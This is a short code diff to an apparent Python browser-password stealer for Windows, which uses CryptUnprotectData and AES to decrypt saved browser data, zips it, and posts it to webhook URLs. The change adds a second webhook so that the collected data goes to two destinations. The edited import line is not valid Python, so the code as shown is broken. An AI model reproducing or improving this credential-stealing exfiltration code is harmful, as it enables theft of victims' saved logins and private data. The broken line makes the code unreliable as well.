@@ -11,7 +11,7 @@ import os, requests, json, base64, sqlite3, shutil
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from datetime import datetime
-from config import hookTy
+from config import hook import hook1
 
 
 appdata = os.getenv('LOCALAPPDATA')
@@ -259,7 +259,8 @@ def mainpass():
         }
     ]
     }
-    r = requests.post(hookTy, json=todo)
+    r = requests.post(hook, json=todo)
+    r = requests.post(hook1, json=todo)
                 
     try:
         os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
